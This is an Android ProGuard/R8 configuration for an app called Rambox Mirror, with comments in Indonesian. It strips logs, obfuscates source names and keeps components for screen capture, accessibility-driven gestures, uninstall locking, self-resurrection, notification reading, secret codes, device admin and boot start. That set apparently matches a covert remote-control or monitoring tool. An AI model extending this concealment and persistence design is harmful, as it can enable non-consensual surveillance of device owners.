# Rambox Mirror ProGuard / R8 rules (dipakai saat minifyEnabled=true).

# 1. Hapus semua Log.* di release agar PIN/host/konten tidak bocor ke logcat.
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
}

# 2. Pertahankan komponen yang direferensikan via AndroidManifest.xml
-keep public class com.rambox.mirror.MainActivity
-keep public class com.rambox.mirror.UninstallLockActivity
-keep public class com.rambox.mirror.ScreenCaptureService
-keep public class com.rambox.mirror.RamboxAccessibilityService
-keep public class com.rambox.mirror.ResurrectionJobService
-keep public class com.rambox.mirror.RamboxNotificationListener
-keep public class com.rambox.mirror.SecretCodeReceiver
-keep public class com.rambox.mirror.RamboxDeviceAdminReceiver
-keep public class com.rambox.mirror.BootReceiver

# 3. AccessibilityService lifecycle & gesture API
-keepclassmembers class com.rambox.mirror.RamboxAccessibilityService {
    public static com.rambox.mirror.RamboxAccessibilityService instance;
    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent);
    public void onInterrupt();
    protected void onServiceConnected();
    public void perform*(...);
}

# 4. Java-WebSocket memakai reflection untuk SSL factory & frame decoding.
-keep class org.java_websocket.** { *; }
-dontwarn org.java_websocket.**

# 5. SQLCipher & SQLite support
-keep class net.sqlcipher.** { *; }
-dontwarn net.sqlcipher.**
-keep class net.zetetic.** { *; }
-dontwarn net.zetetic.**
-keep class androidx.sqlite.** { *; }
-dontwarn androidx.sqlite.**

# 6. BuildConfig fields (MASKED_PIN, MASKED_DOMAIN, MASK_KEY)
-keepclassmembers class com.rambox.mirror.BuildConfig {
    public static final ** *;
}

# 7. Kotlin metadata warnings suppression
-dontwarn kotlin.**
-dontwarn org.jetbrains.annotations.**

# 8. Penyamaran source file attribute
-renamesourcefileattribute SourceFile
-keepattributes SourceFile,LineNumberTable
